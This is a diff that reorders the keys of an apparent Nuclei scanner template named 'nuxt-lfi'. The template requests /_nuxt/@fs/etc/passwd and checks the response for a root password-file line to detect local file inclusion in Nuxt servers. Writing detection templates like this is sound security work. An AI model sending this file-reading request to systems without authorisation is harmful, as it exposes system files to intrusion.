@@ -1,18 +1,15 @@
+http:
+- matchers:
+  - part: body
+    regex:
+    - 'root:.*:0:0:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/_nuxt/@fs/etc/passwd'
 id: nuxt-lfi
-
 info:
-  name: Nuxt Local File Inclusion
   author: reewardius
+  name: Nuxt Local File Inclusion
   severity: high
   tags: lfi,lfr,generic
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/_nuxt/@fs/etc/passwd"
-      
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - "root:.*:0:0:"
